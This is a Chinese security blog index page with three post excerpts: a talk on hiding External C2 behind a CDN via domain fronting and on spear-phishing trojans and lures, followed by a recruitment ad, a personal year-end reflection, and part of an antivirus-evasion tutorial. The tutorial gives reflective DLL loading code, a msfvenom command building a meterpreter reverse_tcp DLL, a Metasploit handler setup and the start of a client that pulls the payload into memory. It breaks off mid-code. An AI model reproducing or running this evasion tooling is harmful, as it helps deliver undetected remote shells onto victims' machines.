<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/30422105c37416eab3a69888fa3dc939.png" alt="2020-02-05-07-13-53" /></p>

<h3 id="domain-fronting--http-请求">Domain Fronting – HTTP 请求</h3>

<p>一个正常的域名解析-请求-响应过程：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e8071631cc8c0130a846e5b1e54b2875.png" alt="2020-02-05-07-14-03" /></p>

<p>当客户端向服务器要请求一个网站时,会先经过DNS请求，然后获得Ｗeb服务器的IP地址进行Socket连接,那么接下来我们再来引入CDN的概念．</p>

<h3 id="domain-fronting---cdn">Domain Fronting –  CDN</h3>

<p>CDN，内容分发网络（Content Delivery Network，CDN）通过将站点内容发布至遍布全国的海量加速节点，使其用户可就近获取所需内容，避免网络拥堵、地域、运营商等因素带来的访问延迟问题，有效提升下载速度、降低响应时间，提供流畅的用户体验。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/59c7e87c09bec7c7b1798df1e802c479.png" alt="2020-02-05-07-14-13" /></p>

<ul>
  <li>Origin Server ： 源站，是网站本身，CDN会将请求以最短路径转发至源站。
 </li>
  <li>Host：HTTP请求中的Host是CDN寻找源站的依据。</li>
</ul>

<p>假设我将mail-box.163.com加入CDN中，向任意节点请求如下数据包，CDN将会把请求转发至mail-box.163.com指定的源站上。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /stage HTTP/1.1
Host: mail-box.163.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari
Connection: Keep-Alive
Cache-Control: no-cache
</code></pre></div></div>
<h3 id="external-c2--控制器的设计http协议状态化">External C2 – 控制器的设计（HTTP协议状态化）</h3>

<p>HTTP协议是无状态的，同时有两个会话上线就糟糕了 - 现以采用SESSION-ID来确定Socket套接字。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1764e040be2f962491ad4842bb282812.png" alt="2020-02-05-07-14-30" /></p>

<p>SESSION-ID：这里的SESSION-ID等于木马在本地生成的Windows GUID。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e9c83e4c2c1d412e9e30b4e5070d53b4.png" alt="2020-02-05-07-14-41" /></p>

<p>最终实现了这一项目，将External C2隐藏在CDN后方。</p>

<h2 id="鱼叉攻击">鱼叉攻击</h2>

<h3 id="鱼叉攻击的木马表现形式">鱼叉攻击的木马表现形式</h3>

<ul>
  <li>宏 – Office</li>
  <li>DLL劫持</li>
  <li>假冒加固工具</li>
  <li>木马捆绑</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c272eaf4008926f8631519b1a72c140c.png" alt="2020-02-05-07-14-51" /></p>

<p>通常办公软件具有最大的安装量，将文档插入邮件中已经是惯用的工作方式，因此许多APT组织在进行鱼叉攻击的过程中也会穿插许多关于Ｏffice的利用技巧。</p>

<h3 id="鱼叉攻击--信">鱼叉攻击 – 信</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/50251bafd2d5c46e358ff8c0d1ae9067.png" alt="2020-02-05-07-15-00" /></p>

<p>上图是我根据分析一些鱼叉攻击的邮件来总结的特点。</p>

<p>信需要串联许多细节性的信息，根据人类的心理，寻找突破口。将目标构建在一个它所熟悉的区域内，将会降低他的警惕性。</p>

<h3 id="鱼叉攻击--自动化">鱼叉攻击 – 自动化</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5a1d756dbf1ccfb7a8818d94599978da.png" alt="2020-02-05-07-15-08" /></p>

<p>安恒红队已经实现了这些技术，构建鱼叉中的每一个环节来模拟鱼叉攻击进行红队行动。</p>

<h2 id="说了那么多安恒红队招人">说了那么多，安恒红队招人！</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>安全招聘
————————
公司：安恒信息
岗位：安全研究员
部门：安服战略支援部
薪资：13-30K
工作年限：1年+
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…

【岗位职责】
1.定期面向部门、全公司技术分享;
2.前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；
3.负责完成部门渗透测试、红蓝对抗业务;
4.负责自动化平台建设
5.负责针对常见WAF产品规则进行测试并落地bypass方案

【岗位要求】
1.至少1年安全领域工作经验；
2.熟悉HTTP协议相关技术
3.拥有大型产品、CMS、厂商漏洞挖掘案例；
4.熟练掌握php、java、asp.net代码审计基础（一种或多种）
5.精通Web Fuzz模糊测试漏洞挖掘技术
6.精通OWASP TOP 10安全漏洞原理并熟悉漏洞利用方法
7.有过独立分析漏洞的经验，熟悉各种Web调试技巧
8.熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）

【加分项】
1.具备良好的英语文档阅读能力；
2.曾参加过技术沙龙担任嘉宾进行技术分享；
3.具有CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP等安全相关资质者；
4.具有大型SRC漏洞提交经验、获得年度表彰、大型CTF夺得名次者；
5.开发过安全相关的开源项目；
6.具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；
7.个人技术博客；
8.在优质社区投稿过文章；

简历投递至 strategy[at]dbappsecurity.com.cn
</code></pre></div></div>
-->
          这个议题是我在公司年会上分享的，但正逢招人浪潮袭来，抱着和大家交流技术的想法的同时，想寻觅几个志同道合的同学来一起做研究！议题我将会总结成文字，为大家分享我的学习成果。
          <p>
            <a class="post-link" href="/archivers/2020-02-05/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-01-25/1">2019年度总结随想</a>
        </h2>
        
        <div class="post-meta">Jan 25, 2020</div>

        <div class="post-excerpt">
          <!--<h2 id="选择与能力">选择与能力</h2>

<p>先来说说选择，选择是一个动作，人生总会面临许多的选择，在体历人生的过程里，随着年龄增长，对事物理解的角度、含义、作用或利益不断地在改变，今天和明天面对同一个选择结果都可能不一样。为什么我这里会使用“体历”而不用“经历”，因为我觉得“体历”更加真实且贴合。有人总说，选择大于努力，而我现在认为选择与努力都不可或缺。现在许多在一、二线城市奋斗的朋友，都讲“成功”二字，我对于成功的理解其实一直都是非常模糊的，只是在某些时候，发现自己拥有一点优势、特点的时候，暗自为自己鼓掌。而且我还认为，<strong>成功不是一个从动变静的过程，更不是一个终点，它也不是一个结果，它是一个状态。</strong></p>

<p>可能这么说让人感觉有些佛系，比如自己生活没有压力的同时又充满正能量的时候，我觉得这就是成功，有人可能会觉得这个人是否有些安于现状，不会寻求改变与刺激？</p>

<p>我时常夜里会睡不着觉，听着歌单重复的音乐，经常半夜爬起来，昏沉的坐着，平常即使是午睡也要把窗帘拉紧，使屋内的光线达到最黑，不论我睁眼闭眼，前方最好都是一个颜色，那时候我就开始了思考，<strong>思考自己哪些决定还不够成熟稳重，哪些交谈表达的不太合适，哪些事情执行的不够利索等等… 我一直在努力寻求主动的改变，但在寻求改变之前，花费了大量的时间去测试自己、去了解自己。</strong> 从哲学上来说，这是人生的一大难题，我看过胡适的一些书籍，深得体会。不是读完了获得了什么，而是读的过程中自己的思想不断考究内心，考究自我。我不断沉浸且享受这种过程，它就像是银河系中某个最具璀璨之名的星星。说完了我了解自己、回味自己，那就要再回到选择了。我的阅历不够丰富，也时常会犯年轻人常犯的错误，我想这一定是必然的。面对选择的过程中，我可能不会那么睿智，但是绝不会优柔寡断，考虑完自身条件、投入比后，我会当机立断，不留后悔的余地，倘若在余地中，这会阻碍我去解决更困难的问题。</p>

<p><strong>没有能力就更没有选择的权利，大部分能力又依附许多后天的努力而产生的。</strong> 这个行业还是挺公平的，至少在我刚入行到现在为止，没有发生让我对这个行业特别失望的事情（也包括安全法发布后带来的现象）。就拿程序猿这个职业来说，前三年掀起开发热潮，Web人才大量紧缺，任何人都可以成为程序猿，进军IT领域，培训机构中也出现了为了面试，拿到Offer而熬夜背代码的人。总之，先了解自己，慢慢养成了解自己的习惯，和自己打交道，把和别人攀比的心态多投入自身，了解自己后就会发现自己做不了哪些事情，然后再发现自己擅长做哪些，扬长避短。<strong>关于扬长避短，我觉得这是个短期的成功，真正的成功是在扬长避短的基础上不断完善自身的。</strong> 能力这里就不多点了，它也太实在了。<strong>最终，我认为有能力才有选择，能力需要在扬长避短的基础上不断完善自身，想要多进一分，必先付出更大的努力，正确的选择前提在于先了解自身。</strong></p>

<h2 id="怀旧一定是好事">“怀旧一定是好事”</h2>

<p>我自己有个偏执的理论，有时候偏执的理论还有很多，甚至闹出了很多笑话，笑话后面再说。</p>

<p>先来说说这个偏执的理论，就是 <strong>“我认为不从科学的角度去观测一个西瓜的内心是否干净纯洁，在还未用刀切开之前，它的内心一定是全世界最干净的，当你切开了，看到的不是最纯净的，因为空气中的细菌已经落在了西瓜的内心上。”</strong></p>

<p>这时有人会说你后面代入了科学角度去下定论，这句话真是不可理喻，起初听起来有点道理，但是细细品读就发现了这一问题。</p>

<p>这个偏执理论跟我的内心一模一样奇怪，“瓜还是不切开的好”，我很怀旧，因此我记得的事情有很多，只要不是刻意让我去记忆，都会在某刻涌现。一个城市很大，我去的地方不会很多，生活过得地方我会觉得格外亲切，当然还有那些现在已经不是朋友的朋友，美好永远都是美好的，希望我的朋友也永远都是没有切开的西瓜。</p>

<hr />

<p>再来说个我让人哭笑不得的偏执理论——“富豪理论”，2014年是我性格的重塑年，以前在学校住宿，和七个室友关系非常好，在熄灯后开始了故事会，轮到我发言的时候，我说起了这个从来不存在的偏执理论，虽然只是临时作为“编剧”，为了让大家伙开心，觉得这个题材还不错，就放开讲了。</p>

<p>原话大概是：“我曾经幻想，不，这可能就是现实，就像ET从来没有被证实一样、就像黑客帝国中的真实世界一样。我家里非常有钱，我来到这个破烂学校全是家里的人花重金安排好的，你们都是配角，价钱高，我活那么大真的找不出破绽，可能爸妈只是想锻炼我，让我加速成长。”说完室友哭笑不得，现在我提起这个编出来讲随口的偏执理论都面红耳赤，那晚讲过后，从未再与人提起过。这个偏执理论触碰到一个内心中的硬壳了，这个硬壳里汇聚了许多封存的、零碎的记忆。</p>

<hr />

<p>某个冬天，北方的天气一如往常寒冷，妈妈把手推车推到出租屋院子门口，风雪交加，烤炉内热浪滚滚，已经放满了刚烤熟的红薯，我知道她要出摊了。那时候我大概五六岁，随着她一起出摊，记忆犹新的是有个大坡，妈妈的力气不够，我就上去使劲推。许多人因为看到母亲带着孩子在冬日里站着，靠一个油漆桶制成的火炉，多买几块红薯，我说冷，她就把我偷偷送入肯德基的后门，从后门进去可以直接进入店内的儿童区域，里面有小城堡、滑滑梯等，那是我人生第一次玩滑滑梯。</p>

<p>从农村出来的爸妈，没有城市人更加“聪明”的办法去赚钱，一推就是十几二十年，我在外一呆就五六年。时常感慨，<strong>他们没有教会我什么好的办法让我生存，但是爱我，教会了我做人本分的道理。</strong> 于此我变得对风险大的事情不敢尝试，像他们一样觉得把钱放在银行收利息是最好的。但我一出家门便是五六年，这带给我的冲击是脱胎换骨，她们看不到我太多的改变是因为我对他们不会改变，这很幸福… 今天，我把硬壳敲开看看，再裹的严实些，希望我能怀揣更多的变化去接纳更多记忆，未来有时候回头再怀旧怀旧，兴许能重启我的泪腺呢？</p>

<h2 id="性格的缺陷">性格的缺陷</h2>

<p>从选择行业、选择工作一步一步过来，其实一直怀揣着一种对他人的感恩，只不过自己又有些问题，从表现上看出来的太少，可以理解为一种性格的缺陷。这种缺陷禁锢着自己在一些想要表达的时候缺失很多情感。从我自己的生命来到这个世界上以来，经历这么多的变化和成长，无疑是受过许多人的帮助与支持，这些人为我做的点滴，都难以言表。我想心怀感恩的成长一定能为这些人祈福，让他们变得更加幸福，我也要不断传递这种能量。</p>

<h2 id="关于我的自述">关于我的自述</h2>

<p>2019年是我成长与变化最大的一年，从前的我从自闭、抑郁、不自信到今天，已经阳光到不行不行了，从上家单位离职时，依稀记得和领导说：“有问题我就去解决问题”，还真是乐观的冲锋派。</p>

<hr />

<p>如果让我用几个词总结2019，那么我会给出如下答案：青春、感动、视角、沉稳。</p>

<p>2019 我组建了一个实验室，第一感觉就是青春，与年龄增长无关，而是一种无所遁形的向心力和张力，给我的人生画下了重要的一笔。同时在共同克服难题的过程中，大家相互体谅，我无以言表，只能不断为大家争取更多的利益，让大家都有成长。我个人认为20岁-25岁还没有学会如何成长，那这个人将会是最快被淘汰的一个，这五年内要对事物的规律拥有一定的掌控力，不然就失去了核心竞争力。再来说说“视角”，从不同人的角度去考虑同一个问题这就是简单的切换视角，不断的切换视角是情商高的表现。某天和我的Leader聊天的时候，聊到部门的建设，我说部门发展至今，有几个前提条件，第一是公司的信任，高层认为这个投入与产出是合理的，第二是资源的倾斜，最典型的表现就是经济特区的开放，第三个就是优秀的价值观宣贯。这三点是我站在从前从未有过得视角总结出来的，或者说没有这个视角也不会思考这种问题。就好像看着天空上的云朵，但是背后还有一大片苍穹和宇宙。</p>

<h2 id="抓住该有的执着">抓住该有的执着</h2>

<p>我非常热爱技术，什么都想会一点，至今为止都觉得全能高手是存在的，也不会浮躁，只优先选择自己热爱的，这点是有些固执的，时常沉浸其中、乐在其中，做技术带给我的反馈有很多，它不断的印证一就是一，不管如何都不会变成二。其次，不断印证类似于成功学中的大道理，努力就有收获之类的话题。技术是我的爱好，而我的工作建设在爱好之上，这对于许多人来说是多么幸福的一件事啊。但有一天我开始怀疑，因为我从一个前辈身上感受到，他除了有和我相同类似的工作的同时，还拥有一个更热爱的爱好，我觉得这是对幸福的一种加持。我开始觉得工作与爱好的融合会让爱好变得浑浊，不那么纯粹。工作是有棱角的，而爱好是没有棱角的。这样的情况普遍也很多，这倒也还算过得去。</p>

<h2 id="最后的最后">最后的最后</h2>

<p>现在是2020.01.25 01:12 ，在杭州。今年没有回家，外面疫情还在慢慢控制，和家人基本没有怎么出门，还好家人立马重视起来了，都戴了口罩，希望这个疫情快快消散，大家都永远健康。</p>

<p>2020年，愿我的朋友们，只争朝夕，不负韶华，能遇到更好的自己！</p>

<ul>
  <li>倾旋</li>
  <li>2020.01.25 01:12</li>
</ul>
-->
          在2019年我有太多变化与成长，记录一下几个较大的动态与思考沉淀。
          <p>
            <a class="post-link" href="/archivers/2020-01-25/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-01-02/1">静态恶意代码逃逸（第六课）</a>
        </h2>
        
        <div class="post-meta">Jan 2, 2020</div>

        <div class="post-excerpt">
          <!--<p>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>

<h2 id="0x01-memorymodule">0x01 MemoryModule</h2>

<p>先来介绍以下MemoryModule这个项目的来源。</p>

<p><a href="https://payloads.online/archivers/2019-03-14/1">MemoryModule-实现原理</a></p>

<p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p>

<p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p>

<p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p>

<p>MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule</p>

<p>但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule</p>

<h2 id="0x02-反射dll加载的实验">0x02 反射DLL加载的实验</h2>

<p>首先体验一下正常DLL加载的过程：</p>

<p>写一个DLL：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;Windows.h&gt;

VOID msg(VOID){
	MessageBox(NULL,TEXT("Test"),TEXT("Hello"),MB_OK);
	return;
}
</code></pre></div></div>

<p>这里我采用了Def文件来进行导出：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5a58ed13a4aed12b1a466bc99899933e.png" alt="2020-01-03-13-05-56" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6ca6716f14e076da9718a63b0eed4684.png" alt="2020-01-03-13-06-15" /></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;;
</span>
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="o">*</span><span class="n">msg</span><span class="p">)(</span><span class="n">VOID</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">msg</span> <span class="n">RunMsg</span><span class="p">;</span>
	<span class="n">HMODULE</span>  <span class="n">hBadCode</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"BadCode-DLL.dll"</span><span class="p">));</span>

	<span class="n">RunMsg</span> <span class="o">=</span> <span class="p">(</span><span class="n">msg</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hBadCode</span><span class="p">,</span><span class="s">"msg"</span><span class="p">);</span>
	<span class="n">RunMsg</span><span class="p">();</span>
	<span class="n">FreeLibrary</span><span class="p">(</span><span class="n">hBadCode</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p>

<p>接下来贴上MemoryModule的使用方法：</p>

<ol>
  <li>将要加载的PE文件读入内存</li>
  <li>初始化MemoryModule句柄</li>
  <li>装载内存</li>
  <li>获得导出函数地址</li>
  <li>执行导出函数</li>
  <li>释放MemoryModule句柄</li>
</ol>

<p>这里我将MemoryModule项目代码放入当前项目：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1e94e086e15e9b1ade88319339dc5433.png" alt="2020-01-03-13-06-38" /></p>

<p>主要是：<code class="language-plaintext highlighter-rouge">MemoryModule.h</code>、<code class="language-plaintext highlighter-rouge">MemoryModule.cpp</code></p>

<p>加载代码</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;;
#include &lt;stdio.h&gt;
#include "MemoryModule.h"
</span>
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="o">*</span><span class="n">msg</span><span class="p">)(</span><span class="n">VOID</span><span class="p">);</span>

<span class="c1">// 打开文件并获取大小</span>
<span class="n">DWORD</span> <span class="nf">OpenBadCodeDLL</span><span class="p">(</span><span class="n">HANDLE</span> <span class="o">&amp;</span> <span class="n">hBadCodeDll</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwszBadCodeFileName</span><span class="p">){</span>
	<span class="n">DWORD</span> <span class="n">dwHighFileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">dwLowFileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="c1">// 打开文件</span>
	<span class="n">hBadCodeDll</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">lpwszBadCodeFileName</span><span class="p">,</span><span class="n">GENERIC_READ</span><span class="p">,</span><span class="n">FILE_SHARE_READ</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">OPEN_ALWAYS</span><span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hBadCodeDll</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">){</span>
		<span class="k">return</span> <span class="n">GetLastError</span><span class="p">();</span>
	<span class="p">}</span>
	<span class="n">dwLowFileSize</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">hBadCodeDll</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwHighFileSize</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">dwLowFileSize</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">msg</span> <span class="n">RunMsg</span><span class="p">;</span>  <span class="c1">// msg函数的函数指针</span>
	<span class="n">HMEMORYMODULE</span> <span class="n">hModule</span><span class="p">;</span> <span class="c1">// MemoryModule句柄，应该可以这么理解,,</span>
	<span class="n">HANDLE</span> <span class="n">hBadCodeDll</span> <span class="o">=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">;</span> <span class="c1">// 打开PE文件的句柄</span>
	<span class="n">WCHAR</span> <span class="n">szBadCodeFile</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">admin</span><span class="se">\\</span><span class="s">Documents</span><span class="se">\\</span><span class="s">Visual Studio 2012</span><span class="se">\\</span><span class="s">Projects</span><span class="se">\\</span><span class="s">BadCode</span><span class="se">\\</span><span class="s">Debug</span><span class="se">\\</span><span class="s">BadCode-DLL.dll"</span><span class="p">);</span> <span class="c1">// PE文件的物理路径</span>
	<span class="n">DWORD</span> <span class="n">dwFileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// PE文件大小</span>
	<span class="n">DWORD</span> <span class="n">dwReadOfFileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// 已读取的PE文件大小</span>
	<span class="n">PBYTE</span> <span class="n">bFileBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// PE文件的内存地址</span>
	
	<span class="c1">// 打开文件</span>
	<span class="n">dwFileSize</span> <span class="o">=</span> <span class="n">OpenBadCodeDLL</span><span class="p">(</span><span class="n">hBadCodeDll</span><span class="p">,</span> <span class="n">szBadCodeFile</span><span class="p">);</span>
	<span class="c1">// 如果打开失败直接退出</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hBadCodeDll</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">){</span>
		<span class="k">return</span> <span class="n">GetLastError</span><span class="p">();</span>
	<span class="p">}</span>
	<span class="c1">// 申请放置PE文件的内存空间</span>
	<span class="n">bFileBuffer</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BYTE</span><span class="p">[</span><span class="n">dwFileSize</span><span class="p">];</span>
	<span class="c1">// 读取文件</span>
	<span class="n">ReadFile</span><span class="p">(</span><span class="n">hBadCodeDll</span><span class="p">,</span><span class="n">bFileBuffer</span><span class="p">,</span><span class="n">dwFileSize</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwReadOfFileSize</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">// 如果读取错误直接退出</span>
	<span class="k">if</span><span class="p">(</span><span class="n">dwReadOfFileSize</span> <span class="o">!=</span> <span class="n">dwFileSize</span><span class="p">){</span>
		<span class="k">return</span> <span class="n">GetLastError</span><span class="p">();</span>
	<span class="p">}</span>
	<span class="c1">// 关闭打开PE文件的句柄</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hBadCodeDll</span><span class="p">);</span>
	<span class="c1">// 导入PE文件</span>
	<span class="n">hModule</span> <span class="o">=</span> <span class="n">MemoryLoadLibrary</span><span class="p">(</span><span class="n">bFileBuffer</span><span class="p">);</span>
	<span class="c1">// 如果加载失败，就退出</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hModule</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
		<span class="n">delete</span> <span class="p">[]</span> <span class="n">bFileBuffer</span><span class="p">;</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="c1">// 获取msg导出函数地址</span>
	<span class="n">RunMsg</span> <span class="o">=</span> <span class="p">(</span><span class="n">msg</span><span class="p">)</span><span class="n">MemoryGetProcAddress</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span><span class="s">"msg"</span><span class="p">);</span>
	<span class="c1">// 运行msg函数</span>
	<span class="n">RunMsg</span><span class="p">();</span>
	<span class="c1">// 释放资源</span>
	<span class="n">MemoryFreeLibrary</span><span class="p">(</span><span class="n">hModule</span><span class="p">);</span>
	<span class="c1">// 释放PE内存</span>
	<span class="n">delete</span> <span class="p">[]</span> <span class="n">bFileBuffer</span><span class="p">;</span>

	<span class="k">return</span> <span class="n">GetLastError</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>运行结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f2ba95d5fb5ab00b0a23a48aea60935.png" alt="2020-01-03-13-06-52" /></p>

<p>能够看到，成功加载并执行了msg函数。</p>

<h2 id="0x03-反射dll与msf联动">0x03 反射DLL与MSF联动</h2>

<p>不知道大家还是否记得第五课的Socket方式加载Shellcode，这里我将复用第五课的代码来实现与MSF的联动免杀。</p>

<p>思路是这样的：</p>

<p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p>

<h3 id="生成dll">生成DLL</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.138 LPORT=8899 -f dll -o ~/y.dll
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/69f793d120060c0a0f2633ca7b9724fe.png" alt="2020-01-03-13-07-02" /></p>

<p><strong>生成了一个5120字节的DLL</strong></p>

<p>然后设置一下MSF DLL发射器：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.170.138 -P 8899
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 192.168.170.138:8899 
msf5 &gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &gt; set payload windows/patchupdllinject/reverse_tcp
payload =&gt; windows/patchupdllinject/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.170.138 
LHOST =&gt; 192.168.170.138
msf5 exploit(multi/handler) &gt; set LPORT 8888
LPORT =&gt; 8888
msf5 exploit(multi/handler) &gt; set DLL ~/y.dll
DLL =&gt; ~/y.dll
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.170.138:8888 
msf5 exploit(multi/handler) &gt; 
</code></pre></div></div>

<p>此时就需要来撸码了，实现一个客户端，去Msf上获取DLL：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;WinSock2.h&gt;
#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include "MemoryModule.h"
#pragma comment(lib,"ws2_32.lib")
</span>
<span class="cp">#define PAYLOAD_SIZE 1024*512
</span><span class="k">typedef</span> <span class="nf">BOOL</span> <span class="p">(</span><span class="o">*</span><span class="n">Module</span><span class="p">)(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span> <span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="o">*</span><span class="n">msg</span><span class="p">)(</span><span class="n">VOID</span><span class="p">);</span>
<span class="n">PBYTE</span> <span class="n">bFileBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>


<span class="n">BOOL</span> <span class="nf">GetPEDLL</span><span class="p">(){</span>
	
	<span class="n">DWORD</span> <span class="n">dwError</span><span class="p">;</span>
	<span class="n">WORD</span> <span class="n">sockVersion</span> <span class="o">=</span> <span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
	<span class="n">WSADATA</span> <span class="n">wsaData</span><span class="p">;</span>
	<span class="n">SOCKET</span> <span class="n">socks</span><span class="p">;</span>
	<span class="n">SHORT</span> <span class="n">sListenPort</span> <span class="o">=</span> <span class="mi">8888</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">WSAStartup</span><span class="p">(</span><span class="n">sockVersion</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wsaData</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[*]WSAStarup Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="n">socks</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>

